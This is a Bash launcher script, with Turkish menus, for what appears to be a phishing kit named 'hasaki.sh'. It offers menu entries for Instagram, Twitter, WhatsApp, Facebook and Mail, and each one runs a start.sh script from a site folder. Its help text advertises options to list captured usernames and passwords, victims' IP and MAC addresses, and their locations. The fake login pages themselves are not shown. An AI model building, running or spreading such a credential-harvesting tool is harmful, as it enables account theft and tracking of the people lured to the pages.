#!/bin/bash
#!/bin/sh
#Code:Mr.Neowise
#Youtube : Serhat Türk
clear
case $1 in

      "--help")
	   sleep 1
       echo -e "
--help & --h   (Yardım Menüsünü Çağırır)
--ıp & --ip    (Ip Adresini Listeler)
--user         (Username & Pass Listeler)
--mac          (Mac Adresleri Listeler)
--location     (Ip Adresinden Konum Tespiti)
bash hasaki.sh & sh hasaki.sh (Aracı Çalıştırır)
   "
  ;;

     "--h")
	   sleep 1
       echo -e "
--help & --h   (Yardım Menüsünü Çağırır)
--ıp & --ip    (Ip Adresini Listeler)
--user         (Username & Pass Listeler)
--mac          (Mac Adresleri Listeler)
--location     (Ip Adresinden Konum Tespiti)
bash hasaki.sh & sh hasaki.sh (Aracı Çalıştırır)"

  ;;

esac

banner(){
echo -e '\033[31;40;1m 
	
▓██   ██▓ ▄▄▄        ██████  █    ██  ▒█████  
 ▒██  ██▒▒████▄    ▒██    ▒  ██  ▓██▒▒██▒  ██▒
  ▒██ ██░▒██  ▀█▄  ░ ▓██▄   ▓██  ▒██░▒██░  ██▒
  ░ ▐██▓░░██▄▄▄▄██   ▒   ██▒▓▓█  ░██░▒██   ██░
  ░ ██▒▓░ ▓█   ▓██▒▒██████▒▒▒▒█████▓ ░ ████▓▒░
   ██▒▒▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░ ▒░▒░▒░ 
 ▓██ ░▒░   ▒   ▒▒ ░░ ░▒  ░ ░░░▒░ ░ ░   ░ ▒ ▒░ 
 ▒ ▒ ░░    ░   ▒   ░  ░  ░   ░░░ ░ ░ ░ ░ ░ ▒  
 ░ ░           ░  ░      ░     ░         ░ ░  
 ░ ░                                          


	   \e[35m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★ Mr.Neowise 🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
	 \e[31m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★ Cyber Turkish 🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
  \e[32m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★  İnstagram  :  @_serhatc  🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
'
echo -e '
\e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
\e[31m[02]\e[32mTwitter			\e[31m[05]\e[32mMail
\e[31m[03]\e[32mWhatsapp			

\e[31m[00] Code

\e[31m[99] Çıkış


'
read -p  "İşlem Numarası:" islem
}



banner
if [[ $islem == 1 || $islem == 01 ]]; then
	sleep 1
	clear
	cd Site/Instagram/
	bash start.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
	sleep 1
	clear
	cd  Site/Twitter/
	bash start.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
	sleep 1
	clear
	cd Site/Whatsapp/
	bash start.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
	sleep 1
	clear
	cd  Site/Facebook/
	bash start.sh

elif [[ $islem == 5 || $islem == 05 ]]; then
	sleep 1
	clear
	cd  Site/Mail/
	bash start.sh
elif [[ $islem == 00 ]]; then

	cd Site/
	bash code.sh

elif [[ $islem == 99 ]]; then
	exit 1
else
	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz....'	
	sleep 1
	clear 
	banner
fi
